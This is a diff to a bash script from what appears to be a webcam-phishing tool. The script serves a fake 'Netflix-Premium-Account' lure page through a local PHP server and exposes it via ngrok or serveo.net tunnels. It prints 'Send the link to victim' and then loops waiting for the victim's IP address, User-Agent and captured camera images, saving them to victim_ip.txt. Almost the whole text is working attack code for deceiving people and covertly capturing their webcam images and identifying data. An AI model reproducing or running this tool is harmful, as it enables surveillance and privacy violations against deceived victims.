@@ -21,6 +21,21 @@ menu
 fi
 
 }
+gcampayload_ngrok() {
+
+gcamngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+server_link+'$gcamngrok_link'+g' .server/camfile/main.html > .server/camfile/Netflix-Premium-Account.html
+sed 's+server_link+'$gcamngrok_link'+g' .server/camfile/grabfile.php > .server/camfile/index.php
+
+}
+gcampayload_serveo() {
+
+gcamserveo_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .grablink)
+sed 's+server_link+'$gcamserveo_link'+g' .server/camfile/main.html > .server/camfile/Netflix-Premium-Account.html
+sed 's+server_link+'$gcamserveo_link'+g' .server/camfile/grabfile.php > .server/camfile/index.php
+
+}
+
 startngrok_gcam() {
 
 if [[ -e .server/camfile/ip.txt ]]; then
@@ -45,21 +60,78 @@ printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $gcamngroklink
 
 gcampayload_ngrok
-
 gcamfound
 
 }
-gcampayload_ngrok() {
 
-gcamngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+server_link+'$gcamngrok_link'+g' .server/camfile/main.html > .server/camfile/Netflix-Premium-Account.html
-sed 's+server_link+'$gcamngrok_link'+g' .server/camfile/grabfile.php > .server/camfile/index.php
+startserveo_gcam() {
 
+if [[ -e .server/camfile/ip.txt ]]; then
+rm -rf .server/camfile/ip.txt
+
+fi
+if [[ -e .server/camfile/cam.log ]]; then
+rm -rf .server/camfile/cam.log
+
+fi
+
+gcamdef_port="5555"
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $gcamdef_port
+read gcamport
+gcamport="${gcamport:-${gcamdef_port}}"
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mhttp://127.0.0.1:$gcamport\e[0m\e[1;92m)\e[0m\n"
+cd .server/camfile && php -S 127.0.0.1:$gcamport > /dev/null 2>&1 & 
+sleep 2
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
+if [[ -e .grablink ]]; then
+rm -rf .grablink
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$gcamport' serveo.net 2> /dev/null > .grablink ' &
+printf "\n"
+sleep 5
+gcam_send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" .grablink)
+printf "\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $gcam_send_url
+
+gcampayload_serveo
+gcamfound
 }
-gcampayload_serveo() {
 
-gcamserveo_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .grablink)
-sed 's+server_link+'$gcamserveo_link'+g' .server/camfile/main.html > .server/camfile/Netflix-Premium-Account.html
-sed 's+server_link+'$gcamserveo_link'+g' .server/camfile/grabfile.php > .server/camfile/index.php
+gcamfound() {
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Victim ,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e ".server/camfile/ip.txt" ]]; then
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
+printf "\e[0m\n"
+gcamip=$(grep -a 'IP:' .server/camfile/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+gcamua=$(grep 'User-Agent:*' .server/camfile/ip.txt | cut -d '"' -f2)
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP :\e[0m\e[1;96m %s\e[0m\n" $gcamip
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m %s\e[0m\n" $gcamua
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m victim_ip.txt\e[0m\n"
+cat .server/camfile/ip.txt >> victim_ip.txt
+rm -rf .server/camfile/ip.txt
+
+fi
+
+sleep 0.5
+
+if [[ -e ".server/camfile/cam.log" ]]; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Image Received !!\n"
+rm -rf .server/camfile/cam.log
+fi
+sleep 0.5
+
+done 
 
 }
